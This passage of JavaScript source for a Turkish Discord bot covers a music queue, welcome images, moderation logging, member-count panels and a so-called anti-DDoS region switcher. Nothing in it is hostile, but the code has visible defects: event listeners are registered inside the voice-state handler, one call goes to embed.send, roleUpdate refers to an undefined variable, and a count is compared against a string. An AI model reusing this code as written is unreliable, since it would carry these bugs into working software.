        `❎ | **Şarkı Sisteminde Problem Var Hata Nedeni: ${error}**`
      );
      queue.delete(msg.guild.id);
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setTitle(
            `❎ | **Şarkı Sisteminde Problem Var Hata Nedeni: ${error}**`
          )
          .setColor("RANDOM")
      );
    }
  } else {
    serverQueue.songs.push(song);
    console.log(serverQueue.songs);
    if (playlist) return undefined;
    return msg.channel.sendEmbed(
      new Discord.RichEmbed()
        .setTitle(`✅ | **${song.title}** Adlı Şarkı Kuyruğa Eklendi!`)
        .setColor("RANDOM")
    );
  }
  return undefined;
}

function play(guild, song) {
  const serverQueue = queue.get(guild.id);

  if (!song) {
    serverQueue.voiceChannel.leave();
    queue.delete(guild.id);
    return;
  }
  console.log(serverQueue.songs);

  const dispatcher = serverQueue.connection
    .playStream(ytdl(song.url))
    .on("end", reason => {
      if (reason === "❎ | **Yayın Akış Hızı Yeterli Değil.**")
        console.log("Şarkı Bitti.");
      else console.log(reason);
      serverQueue.songs.shift();
      play(guild, serverQueue.songs[0]);
    })
    .on("error", error => console.error(error));
  dispatcher.setVolumeLogarithmic(serverQueue.volume / 5);

  serverQueue.textChannel.sendEmbed(
    new Discord.RichEmbed()
      .setTitle("**🎙 Şarkı Başladı**", `https://i.hizliresim.com/RDm4EZ.png`)
      .setThumbnail(
        `https://i.ytimg.com/vi/${song.id}/default.jpg?width=80&height=60`
      )
      .addField("\nBaşlık", `[${song.title}](${song.url})`, true)
      .addField("\nSes Seviyesi", `${serverQueue.volume}%`, true)
      .addField("Süre", `${song.durationm}:${song.durations}`, true)
      .setColor("RANDOM")
  );
}
//hg bb
client.on("guildMemberAdd", async member => {
  const fs = require("fs");
  let gc = JSON.parse(fs.readFileSync("./jsonlar/gc.json", "utf8"));

  const hgK = member.guild.channels.get(gc[member.guild.id].gkanal);
  if (!hgK) return;
  let username = member.user.username;

  const bg = await Jimp.read(
    "https://cdn.discordapp.com/attachments/450693709076365323/473184528148725780/guildAdd.png"
  );
  const userimg = await Jimp.read(member.user.avatarURL);
  var font;
  if (member.user.tag.length < 15)
    font = await Jimp.loadFont(Jimp.FONT_SANS_128_WHITE);
  else if (member.user.tag.length > 15)
    font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
  else font = await Jimp.loadFont(Jimp.FONT_SANS_32_WHITE);
  await bg.print(font, 430, 170, member.user.tag);
  await userimg.resize(362, 362);
  await bg.composite(userimg, 43, 26).write("./img/" + member.id + ".png");
  setTimeout(function() {
    hgK.send(new Discord.Attachment("./img/" + member.id + ".png"));
  }, 1000);
  setTimeout(function() {
    fs.unlink("./img/" + member.id + ".png");
  }, 10000);
  let hgm = JSON.parse(fs.readFileSync("./jsonlar/hgm.json", "utf8"));
  const hgmK = member.guild.channels.get(hgm[member.guild.id].gkanal);
  var kullanici = member.tag;
  var sunucu = member.guild.name;
  hgmK.send(`${gc[member.guild.id].mesaj}`);
});
client.on("guildMemberRemove", async member => {
  const fs = require("fs");
  let gc = JSON.parse(fs.readFileSync("./jsonlar/gc.json", "utf8"));
  const hgK = member.guild.channels.get(gc[member.guild.id].gkanal);
  if (!hgK) return;
  let username = member.user.username;

  const bg = await Jimp.read(
    "https://cdn.discordapp.com/attachments/450693709076365323/473184546477572107/guildRemove.png"
  );
  const userimg = await Jimp.read(member.user.avatarURL);
  var font;
  if (member.user.tag.length < 15)
    font = await Jimp.loadFont(Jimp.FONT_SANS_128_WHITE);
  else if (member.user.tag.length > 15)
    font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);
  else font = await Jimp.loadFont(Jimp.FONT_SANS_32_WHITE);
  await bg.print(font, 430, 170, member.user.tag);
  await userimg.resize(362, 362);
  await bg.composite(userimg, 43, 26).write("./img/" + member.id + ".png");
  setTimeout(function() {
    hgK.send(new Discord.Attachment("./img/" + member.id + ".png"));
  }, 1000);
  setTimeout(function() {
    fs.unlink("./img/" + member.id + ".png");
  }, 10000);
});
//kral ol
client.on("message", async message => {
  var user = message.mentions.users.first() || message.author;
  if (message.content.toLowerCase() === prefix + "kralol") {
    var user = message.mentions.users.first() || message.author;
    if (!message.guild) user = message.author;

    message.channel
      .send(":loudspeaker: | **Kralol** Çerçevesi Uygulanıyor!")
      .then(m => m.delete(1000));
    await message.channel.send(`**${message.author.tag}** Kral İs Back!`);
    Jimp.read(user.avatarURL, (err, image) => {
      image.resize(310, 325);
      Jimp.read(
        "https://cdn.discordapp.com/attachments/501247440054124550/508237135178891264/kral.png",
        (err, avatar) => {
          avatar.resize(310, 325);
          image
            .composite(avatar, 2, 0)
            .write(`./img/snip/${client.user.id}-${user.id}.png`);
          setTimeout(function() {
            message.channel.send(
              new Discord.Attachment(
                `./img/snip/${client.user.id}-${user.id}.png`
              )
            );
          }, 1000);
        }
      );
    });
  }
});
//modlog sistemi
client.on("messageDelete", async message => {
  if (message.author.bot) return;

  var user = message.author;

  var kanal = await db.fetch(`modlogK_${message.guild.id}`);
  if (!kanal) return;
  var kanal2 = message.guild.channels.find("name", kanal);

  const embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setAuthor(`Bir Mesaj Silindi!`, message.author.avatarURL)
    .addField("Kullanıcı Tag", message.author.tag, true)
    .addField("ID", message.author.id, true)
    .addField("Silinen Mesaj", "```" + message.content + "```")
    .setThumbnail(message.author.avatarURL);
  kanal2.send(embed);
});

client.on("messageUpdate", async (oldMsg, newMsg) => {
  if (oldMsg.author.bot) return;

  var user = oldMsg.author;

  var kanal = await db.fetch(`modlogK_${oldMsg.guild.id}`);
  if (!kanal) return;
  var kanal2 = oldMsg.guild.channels.find("name", kanal);

  const embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setAuthor(`Bir Mesaj Düzenlendi!`, oldMsg.author.avatarURL)
    .addField("Kullanıcı Tag", oldMsg.author.tag, true)
    .addField("ID", oldMsg.author.id, true)
    .addField("Eski Mesaj", "```" + oldMsg.content + "```")
    .addField("Yeni Mesaj", "```" + newMsg.content + "```")
    .setThumbnail(oldMsg.author.avatarURL);
  kanal2.send(embed);
});

client.on("roleCreate", async role => {
  var kanal = await db.fetch(`modlogK_${role.guild.id}`);
  if (!kanal) return;
  var kanal2 = role.guild.channels.find("name", kanal);

  const embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setAuthor(`Bir Rol Oluşturuldu!`, role.guild.iconURL)
    .addField("Rol", `\`${role.name}\``, true)
    .addField("Rol Rengi Kodu", `${role.hexColor}`, true);
  kanal2.send(embed);
});

client.on("roleDelete", async role => {
  var kanal = await db.fetch(`modlogK_${role.guild.id}`);
  if (!kanal) return;
  var kanal2 = role.guild.channels.find("name", kanal);

  const embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setAuthor(`Bir Rol Kaldırıldı!`, role.guild.iconURL)
    .addField("Rol", `\`${role.name}\``, true)
    .addField("Rol Rengi Kodu", `${role.hexColor}`, true);
  kanal2.send(embed);
});

client.on("roleUpdate", async role => {
  if (!log[role.guild.id]) return;

  var kanal = await db.fetch(`modlogK_${role.guild.id}`);
  if (!kanal) return;
  var kanal2 = role.guild.channels.find("name", kanal);

  const embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setAuthor(`Bir Rol Güncellendi!`, role.guild.iconURL)
    .addField("Rol", `\`${role.name}\``, true)
    .addField("Rol Rengi Kodu", `${role.hexColor}`, true);
  kanal2.send(embed);
});

client.on("voiceStateUpdate", async (oldMember, newMember) => {
  var kanal = await db.fetch(`modlogK_${oldMember.guild.id}`);
  if (!kanal) return;
  var kanal2 = oldMember.guild.channels.find("name", kanal);

  let newUserChannel = newMember.voiceChannel;
  let oldUserChannel = oldMember.voiceChannel;

  if (oldUserChannel === undefined && newUserChannel !== undefined) {
    const embed = new Discord.RichEmbed()
      .setColor("GREEN")
      .setDescription(
        `**${newMember.user.tag}** adlı kullanıcı \`${newUserChannel.name}\` isimli sesli kanala giriş yaptı!`
      );
    kanal2.send(embed);
  } else if (newUserChannel === undefined) {
    const embed = new Discord.RichEmbed()
      .setColor("RED")
      .setDescription(
        `**${newMember.user.tag}** adlı kullanıcı bir sesli kanaldan çıkış yaptı!`
      );
    kanal2.send(embed);
  }

  client.on("channelCreate", async (channel, member) => {
    var kanal = await db.fetch(`modlogK_${member.guild.id}`);
    const hgK = member.guild.channels.find("name", kanal);
    if (!hgK) return;
    if (!channel.guild) return;
    if (channel.type === "text") {
      var embed = new Discord.RichEmbed()
        .setColor(3066993)
        .setAuthor(channel.guild.name, channel.guild.iconURL)
        .setDescription(`<#${channel.id}> kanalı oluşturuldu. _(metin kanalı)_`)
        .setFooter(`ID: ${channel.id}`);
      embed.send(embed);
    }
    if (channel.type === "voice") {
      var embed = new Discord.RichEmbed()
        .setColor(3066993)
        .setAuthor(channel.guild.name, channel.guild.iconURL)
        .setDescription(`${channel.name} kanalı oluşturuldu. _(sesli kanal)_`)
        .setFooter(`ID: ${channel.id}`);
      hgK.send({ embed });
    }
  });

  client.on("channelDelete", async channel => {
    const fs = require("fs");
    var kanal = await db.fetch(`modlogK_${channel.guild.id}`);

    const hgK = channel.guild.channels.find("name", kanal);
    if (!hgK) return;
    if (channel.type === "text") {
      let embed = new Discord.RichEmbed()
        .setColor(3066993)
        .setAuthor(channel.guild.name, channel.guild.iconURL)
        .setDescription(`${channel.name} kanalı silindi. _(metin kanalı)_`)
        .setFooter(`ID: ${channel.id}`);
      hgK.send({ embed });
    }
    if (channel.type === "voice") {
      let embed = new Discord.RichEmbed()
        .setColor(3066993)
        .setAuthor(channel.guild.name, channel.guild.iconURL)
        .setDescription(`${channel.name} kanalı silindi. _(sesli kanal)_`)
        .setFooter(`ID: ${channel.id}`);
      hgK.send({ embed });
    }
  });
});
//diamond sistemi
client.on("message", async msg => {
  const user = msg.member;

  const diauyetekst = new Discord.RichEmbed()
    .setDescription(
      `**🎊━━━━━━━━━━━━━━━━━━━━🎊\n Herkez Dursun Gold Üye Burada !** \n          >><@${user.id}><<\n🎊━━━━━━━━━━━━━━━━━━━━🎊`
    )
    .setColor("#c987ff");
  let zamanasimi = 300000;
  let dialar = await db.fetch(`cfxz${msg.author.id}`);
  let diadb = await db.fetch(`diasure${msg.author.id}`);
  if (dialar == "diamond") {
    if (diadb !== null && zamanasimi - (Date.now() - diadb) > 0) {
      let time = ms(zamanasimi - (Date.now() - diadb));
    } else {
      if (msg.author.bot) return;
      if (msg.content.length > 1) {
        db.set(`diasure${msg.author.id}`, Date.now());
        msg.channel.send(diauyetekst).then(msg => {
          msg.delete(10000);
        });
      }
    }
  }
});
client.login(ayarlar.token);
/// Anti Ddos
client.on("message", msg => {
  if (client.ping > 2500) {
    let bölgeler = [
      "singapore",
      "eu-central",
      "india",
      "us-central",
      "london",
      "eu-west",
      "amsterdam",
      "brazil",
      "us-west",
      "hongkong",
      "us-south",
      "southafrica",
      "us-east",
      "sydney",
      "frankfurt",
      "russia"
    ];
    let yenibölge = bölgeler[Math.floor(Math.random() * bölgeler.length)];
    let sChannel = msg.guild.channels.find(c => c.name === "ddos-system");

    sChannel.send(
      `Sunucu'ya Vuruyorlar \nSunucu Bölgesini Değiştirdim \n __**${yenibölge}**__ :tik: __**Sunucu Pingimiz**__ :` +
        client.ping
    );
    msg.guild
      .setRegion(yenibölge)
      .then(g => console.log(" bölge:" + g.region))
      .then(g => msg.channel.send("bölge **" + g.region + " olarak değişti"))
      .catch(console.error);
  }
});
//sahibim belirdi
client.on("message", async msg => {
  if (msg.author.id !== ayarlar.sahip) return;
  let kontrol = await db.fetch(`sahipp_${msg.author.id}`);
  if (!kontrol) {
    db.set(`sahipp_${msg.author.id}`, 1);
  }
  //Aşağıdaki "mesaj" kaç mesajda bir atacağını belirtir.
  let mesaj = "100";

  if (kontrol >= mesaj) {
    let codeming = new Discord.RichEmbed()
      .setDescription(
        "**👑 Herkez Dursun Sahibim Burada !!! " +
          msg.member.user.username +
          "👑 **"
      )
      .setColor("RANDOM");
    msg.channel.send(codeming).then(msg => msg.delete(5000));
    db.delete(`sahipp_${msg.author.id}`);
    return;
  }

  db.add(`sahipp_${msg.author.id}`, 1);
});

//server panel sistemi
client.on("guildMemberAdd", async member => {
  let sunucupaneli = await db.fetch(`sunucupanel_${member.guild.id}`);
  if (sunucupaneli) {
    let rekoronline = await db.fetch(`panelrekor_${member.guild.id}`);
    let toplamuye = member.guild.channels.find(x =>
      x.name.startsWith("Toplam Üye •")
    );
    let toplamaktif = member.guild.channels.find(x =>
      x.name.startsWith("Aktif Üye •")
    );
    let botlar = member.guild.channels.find(x => x.name.startsWith("Botlar •"));
    let rekoraktif = member.guild.channels.find(x =>
      x.name.startsWith("Rekor Aktiflik •")
    );

    if (
      member.guild.members.filter(off => off.presence.status !== "offline")
        .size > rekoronline
    ) {
      db.set(
        `panelrekor_${member.guild.id}`,
        member.guild.members.filter(off => off.presence.status !== "offline")
          .size
      );
    }
    try {
      toplamuye.setName(`Toplam Üye • ${member.guild.members.size}`);
      toplamaktif.setName(
        `Aktif Üye • ${
          member.guild.members.filter(off => off.presence.status !== "offline")
            .size
        }`
      );
      botlar.setName(
        `Botlar • ${member.guild.members.filter(m => m.user.bot).size}`
      );
      rekoraktif.setName(`Rekor Aktiflik • ${rekoronline}`);
    } catch (e) {}
  }
});

client.on("guildMemberRemove", async member => {
  let sunucupaneli = await db.fetch(`sunucupanel_${member.guild.id}`);
  if (sunucupaneli) {
    let rekoronline = await db.fetch(`panelrekor_${member.guild.id}`);
    let toplamuye = member.guild.channels.find(x =>
      x.name.startsWith("Toplam Üye •")
    );
    let toplamaktif = member.guild.channels.find(x =>
      x.name.startsWith("Aktif Üye •")
    );
    let botlar = member.guild.channels.find(x => x.name.startsWith("Botlar •"));
    let rekoraktif = member.guild.channels.find(x =>
      x.name.startsWith("Rekor Aktiflik •")
    );

    if (
      member.guild.members.filter(off => off.presence.status !== "offline")
        .size > rekoronline
    ) {
      db.set(
        `panelrekor_${member.guild.id}`,
        member.guild.members.filter(off => off.presence.status !== "offline")
          .size
      );
    }
    try {
      toplamuye.setName(`Toplam Üye • ${member.guild.members.size}`);
      toplamaktif.setName(
        `Aktif Üye • ${
          member.guild.members.filter(off => off.presence.status !== "offline")
            .size
        }`
      );
      botlar.setName(
        `Botlar • ${member.guild.members.filter(m => m.user.bot).size}`
      );
      rekoraktif.setName(`Rekor Aktiflik • ${rekoronline}`);
    } catch (e) {}
  }
});